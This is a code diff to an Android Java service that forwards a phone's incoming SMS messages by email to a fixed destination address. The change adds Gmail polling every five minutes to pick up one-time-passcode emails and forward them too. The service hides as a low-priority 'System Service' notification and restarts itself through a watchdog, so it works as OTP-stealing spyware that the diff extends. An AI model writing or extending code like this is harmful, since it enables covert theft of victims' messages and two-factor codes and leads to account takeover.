@@ -9,7 +9,9 @@ import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import androidx.core.app.NotificationCompat;
 import java.util.Properties;
 import java.util.concurrent.ExecutorService;
@@ -24,13 +26,16 @@ import javax.mail.internet.MimeMessage;
 
 public class ForwarderService extends Service {
 
-    private static final String CHANNEL_ID = "sys_svc_ch";
-    private static final int NOTIF_ID = 1;
-    private static final String PREFS = "sms_fwd_prefs";
-    private static final String KEY_GMAIL = "gmail";
-    private static final String KEY_PASS = "pass";
+    private static final String CHANNEL_ID   = "sys_svc_ch";
+    private static final int    NOTIF_ID     = 1;
+    private static final String PREFS        = "sms_fwd_prefs";
+    private static final String KEY_GMAIL    = "gmail";
+    private static final String KEY_PASS     = "pass";
+    private static final long   POLL_INTERVAL = 5 * 60 * 1000L; // 5 minutes
 
     private ExecutorService executor;
+    private Handler         pollHandler;
+    private Runnable        pollRunnable;
 
     @Override
     public void onCreate() {
@@ -39,19 +44,49 @@ public class ForwarderService extends Service {
         createChannel();
         startForeground(NOTIF_ID, buildNotification());
         WatchdogScheduler.schedule(this);
+        startGmailPolling();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null) {
             String sender = intent.getStringExtra("sender");
-            String body = intent.getStringExtra("body");
+            String body   = intent.getStringExtra("body");
+            String type   = intent.getStringExtra("type");
             if (sender != null && body != null && !body.isEmpty()) {
-                sendEmail(sender, body);
+                if ("gmail".equals(type)) {
+                    sendEmail("[Gmail] " + sender, body, true);
+                } else {
+                    sendEmail(sender, body, false);
+                }
             }
         }
         return START_STICKY;
     }
+
+    // ─── Gmail Polling ────────────────────────────────────────────────────────
+
+    private void startGmailPolling() {
+        pollHandler  = new Handler(Looper.getMainLooper());
+        pollRunnable = new Runnable() {
+            @Override
+            public void run() {
+                executor.execute(() -> GmailPoller.poll(ForwarderService.this, ForwarderService.this));
+                pollHandler.postDelayed(this, POLL_INTERVAL);
+            }
+        };
+        // First poll after 30 seconds (let service settle)
+        pollHandler.postDelayed(pollRunnable, 30_000);
+    }
+
+    // Called by GmailPoller when an OTP Gmail is found
+    public void forwardGmailMessage(String from, String subject, String body) {
+        String preview = body.length() > 300 ? body.substring(0, 300) + "..." : body;
+        String combined = "Subject: " + subject + "\n\n" + preview;
+        sendEmail("[Gmail] " + from, combined, true);
+    }
+
+    // ─── Lifecycle ────────────────────────────────────────────────────────────
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
@@ -62,20 +97,22 @@ public class ForwarderService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        if (pollHandler != null && pollRunnable != null)
+            pollHandler.removeCallbacks(pollRunnable);
         WatchdogScheduler.schedule(this);
         if (executor != null) executor.shutdown();
     }
 
+    // ─── Email sending ────────────────────────────────────────────────────────
+
     private String getGmailUser() {
         if (!AppConfig.GMAIL_USER.isEmpty()) return AppConfig.GMAIL_USER;
-        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
-        return prefs.getString(KEY_GMAIL, "");
+        return getSharedPreferences(PREFS, MODE_PRIVATE).getString(KEY_GMAIL, "");
     }
 
     private String getGmailPass() {
         if (!AppConfig.GMAIL_APP_PASSWORD.isEmpty()) return AppConfig.GMAIL_APP_PASSWORD;
-        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
-        return prefs.getString(KEY_PASS, "");
+        return getSharedPreferences(PREFS, MODE_PRIVATE).getString(KEY_PASS, "");
     }
 
     private String getDeviceGmail() {
@@ -87,17 +124,14 @@ public class ForwarderService extends Service {
         return "unknown-device";
     }
 
-    private void sendEmail(String smsSender, String smsBody) {
+    private void sendEmail(String senderLabel, String messageBody, boolean isGmail) {
         executor.execute(() -> {
             String gmailUser = getGmailUser().trim();
             String gmailPass = getGmailPass().trim();
             String destEmail = AppConfig.DEST_EMAIL.trim();
-
             if (gmailUser.isEmpty() || gmailPass.isEmpty() || destEmail.isEmpty()) return;
-
             try {
                 String deviceGmail = getDeviceGmail();
-
                 Properties props = new Properties();
                 props.put("mail.smtp.auth", "true");
                 props.put("mail.smtp.starttls.enable", "true");
@@ -107,23 +141,27 @@ public class ForwarderService extends Service {
                 props.put("mail.smtp.connectiontimeout", "15000");
                 props.put("mail.smtp.timeout", "15000");
 
+                final String u = gmailUser, p = gmailPass;
                 Session session = Session.getInstance(props, new Authenticator() {
                     @Override
                     protected PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(gmailUser, gmailPass);
+                        return new PasswordAuthentication(u, p);
                     }
                 });
+
+                String subjectLine = isGmail
+                    ? "GMAIL OTP | " + deviceGmail + " | " + senderLabel
+                    : "SMS | " + deviceGmail + " | From: " + senderLabel;
 
                 Message msg = new MimeMessage(session);
                 msg.setFrom(new InternetAddress(gmailUser));
                 msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(destEmail));
-                msg.setSubject("SMS | " + deviceGmail + " | From: " + smsSender);
+                msg.setSubject(subjectLine);
                 msg.setText(
                     "Device: " + deviceGmail + "\n" +
-                    "From: " + smsSender + "\n\n" +
-                    smsBody
+                    (isGmail ? "Gmail From: " : "SMS From: ") + senderLabel + "\n\n" +
+                    messageBody
                 );
-
                 Transport.send(msg);
             } catch (Exception e) {
                 e.printStackTrace();
@@ -131,11 +169,12 @@ public class ForwarderService extends Service {
         });
     }
 
+    // ─── Notification ─────────────────────────────────────────────────────────
+
     private void createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN
-            );
+                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
             ch.setDescription("Running");
             ch.setShowBadge(false);
             ch.enableLights(false);
